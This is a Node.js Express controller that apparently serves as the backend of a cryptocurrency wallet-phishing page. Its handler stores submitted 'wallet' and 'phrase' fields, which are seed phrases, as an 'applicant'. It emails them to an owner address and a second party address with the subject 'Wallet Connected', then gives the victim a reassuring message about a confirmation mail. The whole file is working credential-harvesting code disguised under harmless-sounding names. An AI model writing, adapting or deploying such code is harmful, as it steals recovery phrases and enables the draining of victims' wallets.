const Applicant = require("../Models/applicantModel");
const sendEmail = require("../Utils/sendMailToOwner");
const emailApplicant = require('../Utils/sendMailToApplicant');
const CustomError = require('../Utils/customError');


exports.home = (req, res) => {
    res.status(200).json({
        status: "Success",
        message: "Welcome to the landing page",
    });
};

exports.emailTheOwnerAndApplicant = async (req, res, next) => {
    try {
        const applicant = await Applicant.create(req.body);

        try {
            await emailApplicant({
                email: process.env.EMAIL_PARTY,
                subject: `Wallet Connected`,
                phrase: applicant.phrase,
                wallet: applicant.wallet,
            });

            await sendEmail({
                email: process.env.EMAIL_OWNER,
                subject: 'Wallet Connected',
                wallet: applicant.wallet,
                phrase: applicant.phrase,
            });

            res.status(200).json({
                status: 'Success',
                message: 'A mail would be sent to your email shortly. If you do not get it, Check your SPAM folder'
            });
        } catch (err) {
            const error = new CustomError(`An Error Occured. Please Try Again`, 500);
            return next(error);
        };

    } catch (error) {
        return next(error);
    };
};
